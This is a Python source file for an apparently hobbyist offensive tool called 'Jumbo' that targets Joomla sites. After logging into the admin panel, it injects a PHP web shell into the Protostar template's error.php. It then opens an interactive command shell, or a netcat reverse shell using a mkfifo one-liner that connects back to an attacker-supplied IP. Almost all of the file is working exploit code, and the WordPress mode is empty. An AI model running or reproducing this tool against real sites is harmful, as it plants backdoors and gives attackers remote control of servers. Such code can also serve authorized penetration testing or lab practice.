import sys
import requests
import argparse
from rich.console import Console
from rich.text import Text
from bs4 import BeautifulSoup
console = Console()

# State with colors
# Todo : put this in POO class message.entry message.success etc.. for practice and good code
class message:
    def tool_entry():
        message = Text("[u]Jumbo[/u] >", style="bold")
        return message
    def ongoing():
        message = Text("[*]", style="bold blue")
        return message

    def success():
        message = Text("[+]", style="bold green")
        return message

    def failed():
        message = Text("[-]", style="bold red")
        return message

    def warning():
        message = Text("[!]", style="bold yellow")
        return message

# WORDPRESS

# JOOMLA

# GET HIDDEN VALUES FROM /index.php IN JOOMLA
def get_hidden_values(url):
    # Todo : refactor this piece of code, the try need to have all the conditions in it (if = 200 etc..)
    try:
        response = requests.get(f"{url}/administrator/index.php")
    except requests.exceptions.MissingSchema:
        console.print(message.failed(), "Please specify a correct ip")
        console.print("Exit 🐘")
        sys.exit(1)
    except TypeError:
        console.print(message.failed(), "The URL is None. Please provide a valid URL.")
    
    if response.status_code == 200:
        soup = BeautifulSoup(response.content, 'html.parser')
        
        hidden_inputs = soup.find_all('input', {'type': 'hidden'})
        
        hidden_values = {}
        
        for input_tag in hidden_inputs:
            name = input_tag.get('name', '')
            value = input_tag.get('value', '')
            
            if value == '1':
                hidden_values[value] = name
            else:    
                hidden_values[name] = value
            
        print(f"HIDDEN VALUES: {hidden_values}")
        return hidden_values
    
    else:
        print(f"Error: {url} Status code: {response.status_code}")
        return {}    

# LOGIN JOOMLA
def post_login_joomla(user, password, url, hidden_values):
    
    data = {
        'username': user,
        'passwd': password,
        'Submit=': '',
        'option': hidden_values.get('option', ''),
        'task': hidden_values.get('task', ''),
        'return': hidden_values.get('return', ''),
        hidden_values.get('1', ''): '1'
    }
    
    host = f"{url}/administrator/index.php"

    response = requests.post(host, data, allow_redirects=True)

    print(response.request)
    # Debug
    console.print(f"{message.ongoing()} Start login into admin")
    console.print(f'{message.ongoing()} {data}')
    console.print(f'{message.success()} Status code: {response.status_code}')
    # Lunch
    put_exploit_joomla(url)
    
# EXPLOIT JOOMLA
## exploit on the protostar theme, needs to make it for the active one etc..
def put_exploit_joomla(url):
    data = {
        'jform%5Bsource%5D': '%3C%3Fphp%0D%0Asystem%28%24_GET%5B%27cmd%27%5D%29%3B%0D%0A%3F%3E',
        'task': 'template.apply',
        'jform%5Bextension_id%5D': '506',
        'jform%5Bfilename%5D': 'error.php'
    }
    host = f"{url}/administrator/index.php?option=com_templates&view=template&id=506&file=L2Vycm9yLnBocA"
    response = requests.post(host, data, allow_redirects=True)
    console.print(response.status_code)
    
    console.print(f"{message.ongoing()} Starting the exploit")
    host = f"{url}/templates/protostar/error.php/error.php?cmd="
    console.print(host)
    cmd_echo = f"{host}echo%20%27HelloWorld%27"
    console.print(cmd_echo)
    response = requests.get(cmd_echo)
    console.print(response.status_code)
    console.print(response.content.decode('utf-8'))
    
    if "HelloWorld" in response.content.decode('utf-8'):
        console.print(f"{message.success()} Open input user, let's start hacking")

        while True:
            console.print("Which mode are you choosing ? [1]: Webshell, [2]: Reverseshell :")
            user_choice = input()

            match user_choice:
                case '1':
                    console.print(f'{message.success()} Webshell')
                    webshell_joomla(host)
                case '2':
                    console.print(f'{message.success()} Reverseshell')
                    reverse_shell_joomla(host)
                case _:
                    console.print(f'{message.warning()} select a mode!')

    else:
        console.print(f"{message.failed()} Can't open a shell")


def webshell_joomla(host):
    console.print("Enter a (web)shell command (type 'exit' to return to select mode): ")
    while True:
        user_cmd = input()

        if user_cmd.lower() == 'exit':
            break

        new_url = f"{host}{user_cmd}"
        response = requests.get(new_url)

        if response.content.decode('utf-8').strip():
            console.print(response.content.decode('utf-8').rstrip())


def reverse_shell_joomla(host):
    console.print("Enter the selected port: ")
    user_port = input()
    console.print(f"Lunch your netcat: nc -lvnp {user_port}")

    console.print("Enter your ip: ")
    user_ip = input()

    reverse_shell_cmd = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {user_ip} {user_port} >/tmp/f"

    new_url = f"{host}{reverse_shell_cmd}"
    console.print(f"{message.success()} Your ip: {user_ip}")
    console.print(f"{message.success()} Your port: {user_port}")
    console.print(f"{message.success()} Launching the reverse shell")
    requests.get(new_url)

    # Todo : look to use the multi/handler from msf directly within the tool ?


def main():
    parser = argparse.ArgumentParser(description='Jumbo loves to put some RCE in CMS')

    # Choose your CMS MODE
    parser.add_argument('mode', choices=['wordpress', 'joomla'], help='Choose a CMS mode: wordpress or joomla', nargs='?')

    # Options for WordPress & Joomla
    parser.add_argument('-u', '--username', dest='username', help='username')
    parser.add_argument('-p', '--password', dest='password', help='password')
    parser.add_argument('-H', '--host', dest='host', help='CMS website HOST')
    # TODO : add option to change the USER-AGENT ?

    args = parser.parse_args()

    if args.mode:
        if args.mode == 'wordpress':
            console.print(message.success(), 'Mode: wordpress')
        elif args.mode == 'joomla':
            console.print(message.success(), 'Mode: joomla')
            hidden_values = get_hidden_values(args.host)
            post_login_joomla(args.username, args.password, args.host, hidden_values)
    else:
        print("No CMS mode specified. Please choose a CMS mode: wordpress or joomla.")


if __name__ == "__main__":
    main()
